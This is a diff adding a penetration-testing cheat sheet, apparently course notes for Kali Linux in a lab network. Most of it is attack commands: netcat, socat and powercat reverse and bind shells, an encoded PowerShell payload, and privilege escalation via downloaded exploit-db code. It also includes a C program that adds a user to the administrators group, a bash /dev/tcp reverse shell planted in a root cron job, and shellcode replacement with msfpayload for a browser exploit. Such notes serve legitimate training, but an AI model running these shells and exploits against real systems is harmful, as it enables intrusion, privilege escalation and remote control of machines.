@@ -1,0 +1,452 @@
+Pentesting with Kali
+
+
+# Environment Variables
+
+echo $PATH
+echo $USER                                                          Current user
+echo $HOME                                                          Home directory
+echo $PWD                                                           Present working directory
+
+export t=192.168.1.10                                               Set the target IP as a variable
+nmap $t
+
+env                                                                 Environment variables
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Bash
+
+history                                                             List commands that have been entered into the shell
+!<command number>                                                   Re-run a specific command
+!802                                                                Re-run command 802
+
+$HISTSIZE                                                           Controls the number of commands stored for the current session
+$HISTFILESIZE                                                       How many command are kept in the .bash_history file
+
+<up arrow>                                                          Scrolls back in history
+<down arrow>                                                        Scrolls forward in history
+<ctrl+r> <letter>                                                   Reverse i search facility
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+standard input    (STDIN)    0                                      Data fed into the program
+standard output   (STDOUT)   1                                      Output from the program (deafult to terminal)
+standard error    (STDERR)   2                                      Error messages (defaults to terminal)
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Text Searching & Manipulation
+
+See discover/notes/bash.sh
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Netcat
+
+Kali                    192.168.1.5
+Windows                 192.168.1.10
+
+- Interact with a service
+Kali                    nc -nv 192.168.1.10 110
+
+- Chat
+Kali                    nc -nv 192.168.1.10 4444
+Windows                 nc.exe -lvnp 4444
+
+- Transfer a file
+Windows                 nc.exe -lvnp 4444 > wget.exe
+Kali                    nc -nv 192.168.1.10 4444 < /usr/share/windows-binaries/wget.exe
+There is no output letting you know when the transfer is complete.
+
+- Bind shell
+Kali                    nc -nv 192.168.1.10 4444
+Windows                 nc.exe -lvnp 4444 -e cmd.exe
+Kali                    You will see a Windows prompt
+
+- Reverse shell
+Windows                 nc.exe -lvnp 4444
+Kali                    nc -nv 192.168.1.10 4444 -e /bin/bash
+Windows                 You will not see a Linux prompt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Socat
+
+https://github.com/tech128/socat-2.0.0-b8-windows
+
+- Interact with a service
+Kali                    socat - TCP4:192.168.1.10:110
+
+- Chat
+Kali                    socat TCP4-LISTEN:443 -
+Windows                 socat.exe - TCP4:192.168.1.5:443
+
+- Transfer a file
+Kali                    socat TCP4-LISTEN:443,fork file:names.txt
+Windows                 socat.exe TCP4:192.168.1.5:443 file:file-received.txt,create
+
+- Reverse shell
+Windows                 socat.exe -d -d TCP4-LISTEN:443 -
+Kali                    socat TCP4:192.168.1.10:443 EXEC:/bin/bash
+Windows                 You will not see a Linux prompt
+
+- Encrypted bind shell
+Kali                    openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+                        cat bind_shell.key bind_shell.crt > bind_shell.pem
+                        socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+Windows                 socat.exe - OPENSSL:192.168.1.5:443,verify=0
+                        You will not see a Linux prompt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# PowerShell
+
+- Policy
+Right click on the Start button > Command Prompt (Admin) > Yes
+Set-ExecutionPolicy Unrestricted
+Y
+Get-ExecutionPolicy     Validate the policy
+
+- File transfer
+Kali                    cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/
+                        service apache2 start
+Windows                 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.1.5/wget.exe','C:\Users\lee\Desktop\wget.exe')"
+
+- Reverse shell
+Kali                    nc -lvnp 443
+Windows                 (big blog of code)
+
+- Bind shell
+Windows                 (big blog of code)
+Kali                    nc -nv 192.168.1.11 443
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Powercat (Windows Defender detects as malware and deletes)
+
+-Windows
+https://github.com/besimorhino/powercat
+powershell.exe -nop -exec bypass                                    Start PowerShell and bypass the execution policy
+Import-Module .\powercat.ps1
+powercat -h                                                         Show the help
+
+- File transfer
+Kali                    nc -lvnp 443 > receiving_powercat.ps1
+Windows                 powercat -c 192.168.1.5 -p 443 -i C:\Users\Lee\Desktop\powercat.ps1
+Kali                    Kill nc and see if the file has been received
+
+- Reverse shell
+Kali                    nc -lvnp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe
+
+- Bind shell
+Windows                 powercat -l -p 443 -e cmd.exe
+Kali                    nc -nv 192.168.1.10 443
+
+- Stand alone payload
+Kali                    nc -lvnp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe -g > reverseshell.ps1
+                        .\reverseshell.ps1
+
+- Stand alone encoded payload
+Kali                    nc -lvnp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe -ge > encoded-reverseshell.ps1
+                        notepad .\encoded-reverseshell.ps1
+                        Select all the text
+                        powershell.exe -E <paste>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Wireshark
+
+Filter: net <CIDR>                                                  Filter on traffic from a particular subnet
+Select the interface to use
+
+- Display filter
+tcp.port == 21                                                      Narrow down the background traffic, focus on only the FTP protocol
+
+- Following TCP streams
+Right click on a packet > Follow > TCP Stream                       Much easier to read
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# tcpdump
+
+tcpdump -r <capture.pcap>                                           Read a file
+
+- Filtering traffic
+tcpdump -n -r <capture.pcap> | awk '{print $3}' | sort | uniq -c | head
+tcpdump -n src host <target IP> -r <capture.pcap>                   Specify a source
+tcpdump -n dst host <target IP> -r <capture.pcap>                   Specify a destination
+tcpdump -n port <port> -r <capture.pcap>                            Specify a port
+tcpdump -nX -r <capture.pcap>                                       Read a file and dump in hex and ASCII format
+
+- Advanced header filtering
+To better inspect the requests and responses, we need to filter out and display only the data packets
+tcpdump -A -n 'tcp[13] = 24' -r <capture.pcap>                      Look for packets with only the ACK and PSH flags turned on
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Passive Info Gathering
+
+- whois
+whois target.com
+whois <target IP>
+
+- Google Hacking
+site:target.com                                                     Approximate web presence of an organization
+filetype:pdf					                                 Locate all pdf files
+intitle:"index of" "parent directory"
+inurl:
+
+keys list
+keys add <key> <value>
+
+marketplace refresh
+marketplace install all
+
+workspaces list
+workspaces create <target.com>
+db insert companies
+<Target>
+db insert domains
+<target.com>
+show companies
+show domains
+
+modules load <module>
+info
+options set SOURCE <target.com>
+run
+back
+show hosts
+
+- GitHub
+user:megacorpone filename:users
+
+-Shodan
+hostname:target.com
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Active Info Gathering
+
+- DNS
+host target.com                                                     Returns the A record
+host -t <type> target.com                                           Query for a specific type of record
+    mx = mail server
+    ns = name server
+
+- Forward lookup
+See discover/misc/dns-forward.sh
+
+- Reverse lookup
+See discover/misc/dns-reverse.sh
+
+- Zone transfer
+See discover/misc/dns-transfer.sh
+
+- Automated tools
+dnsrecon
+dnsenum
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# iptables
+
+iptables -I <chain> <position of rule> -s <source IP> -j <action>
+iptables -I INPUT 1 -s 192.168.1.5 -j ACCEPT
+iptables -I OUTPUT 1 -d 192.168.1.5 -j ACCEPT
+iptables -Z                                                         Zero the packet and byte counters in all chains
+
+nmap <target IP>                                                    Generate some traffic
+iptables -vn -L
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# masscan
+
+masscan -p<port> <target CIDR> --rate=1000 -e <interface> --router-ip <gateway IP>
+masscan -p80 10.0.1.0/24 --rate=1000 -e tap0 --router-ip 10.0.1.1   Scan through a VPN tunnel
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SMB
+
+nbtscan -r <CIDR>                                                   Scans for port 137/UDP
+
+ls -l /usr/share/nmap/scripts/smb*                                  nmap SMB scripts
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# NFS
+
+nmap -Pn -n -T4 --open -p111 --script=rpcinfo <CIDR>
+
+ls -l /usr/share/nmap/scripts/nfs*                                  nmap NFS scripts
+nmap -Pn -n -T4 --open -p111 --script=nfs* <CIDR>
+
+mkdir -p remote-share                                               Create a new folder
+mount -o nolock <target IP>:/<share> remote-share/                  Mount remote share to new folder
+cd remote-share/
+ls -l
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SMTP
+
+nc -nv <target IP> 25
+VRFY root
+VRFY idontexist
+quit
+
+vrfy.py (need to write a script here)
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SNMP
+
+Based on UDP, a simple stateless protocol.
+v1, 2 and 2c offer no encryption.
+
+- Management Information Bases (MIB) Tree
+
+1.3.6.1.2.1.25.1.6.0       System processes
+1.3.6.1.2.1.25.4.2.1.2     Running Windows processes
+1.3.6.1.2.1.25.4.2.1.4     Processes path
+1.3.6.1.2.1.25.2.3.1.4     Storeage units
+1.3.6.1.2.1.25.6.3.1.2     Software name
+1.3.6.1.4.1.77.1.2.25      Windows user accounts
+1.3.6.1.2.1.6.13.1.3       Windows TCP ports
+
+onesixty -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i targets.txt
+
+snmpwalk -v <version> -c <string> <target IP> <MIB>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Vulnerability Scanning
+
+cat /usr/share/nmap/scripts/script.db | grep vuln | cut -d '"' -f2 | cut -d '.' -f1 > vulns.txt
+
+nmap -Pn -n -T4 --open --script vuln <target IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Web Application Attacks
+
+- Methodology
+What does the app do?
+What language is it written in?
+What server software is the app running on?
+
+- Technology stack in use
+Programming language and frameworks
+Web server software
+Database software
+Server OS
+
+dirb https://target.com -r -z 10
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+searchsploit
+   -m, --mirror   Mirror (aka copies) an exploit to the current working directory.
+   local|remote
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Local Privilege Escalation - Linux
+
+ssh user@192.168.1.10
+id                                                                  Show user/group permissions
+cat /etc/shadow                                                     Access denied
+/etc/issue                                                          OS info
+uname -a                                                            Kernel info
+
+wget -O exploit.c http://www.exploit-db.com/download/18411
+gcc -o exploit exploit.c                                            Compile exploit
+./exploit                                                           Run exploit
+id                                                                  Show user/group permissions
+cat /etc/shadow
+
+Option 2 - using Kali
+searchsploit linux local root
+Mempodipper - Linux Local Root => 2.6.39 (32-bit & 64-bit)          /linux/local/18411.c
+cp /usr/share/exploitdb/platforms/linux/local/18411.c /tmp/
+cd /tmp/
+gcc -o exploit 18411.c                                              Compile exploit
+service apache2 start                                               Start apache
+netstat -antp | grep apache                                         Verify the service is running
+cp /tmp/exploit /var/www/                                           Copy the exploit to the web root
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Local Privilege Escaltion - Windows XP, 2003
+
+searchsploit ms11-080
+cp /usr/share/exploitdb/platforms/windows/local/18176.py /tmp/
+cd /usr/share/pyinstaller/ 
+pyinstaller -F -n evil.exe /tmp/18176.py
+cp evil.exe/dist/evil.exe /tmp/
+service apache2 start                                               Start apache
+netstat -antp | grep apache                                         Verify the service is running
+cp /tmp/evil.exe /var/www/                                          Copy the exploit to the web root
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Weak Services - Windows
+
+- Windows
+Install vuln app
+services.msc
+Find the service > RC > Properties
+Note the path to executable
+cd to that directory
+icacls vulnapp.exe                                                  Misconfigured if the Everyone group has access
+
+- Kali
+cat adduser.c
+#include <stdlib.h>
+int main ()
+{
+    int i;
+    i=system ("net localgroup administrators lee /add");
+    return 0;
+}
+
+i586-mingw32msvc-gcc adduser.c -o adduser.exe                       Cross compile code
+file adduser.exe
+mv adduser.exe /var/www/
+
+- Windows
+Open IE to <kali-ip>/adduser.exe
+move vulnapp.exe vulnapp.exe-old
+copy c:\users\lee\Downloads\adduser.exe vulnapp.exe
+log off
+log back on
+services.msc
+Restart vulnapp
+The account with Users privs should how have Admin privs
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Weak Services
+
+find / -perm -2 ! -type l -ls 2>/dev/null                           Search for WORLD writable files.
+
+Look for any cron jobs that are WORLD writable running at root.
+nano /etc/cron.hourly/test.sh
+bash -i >& /dev/tcp/<kali-ip>/443 0>&1
+
+Kali
+nc -lvnp 443
+Once the cron job runs, you should have a shell with root privs.
+id
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Client Side Attacks
+
+MS12-037
+CVE 2012-1876
+wget -O exploit.html http://www.exploit-db.com/download/24017
+mv exploit.html /var/www/
+service apache2 start
+
+- Windows
+Open IE to <Kali IP>/exploit.html
+netstat -an:find “4444”                                             Look for a bind shell
+
+- Kali
+nc -v 192.168.1.10 4444
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Replacing Shellcode
+
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 J
+314 bytes in size
+342-314=28 bytes left over
+Copy over the new buffer, then add 28 nops.
+%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090
+nc -lvnp 443
+
+- Windows
+Open IE to 192.168.1.5/exploit.html
+nc -nv 192.168.1.11 443
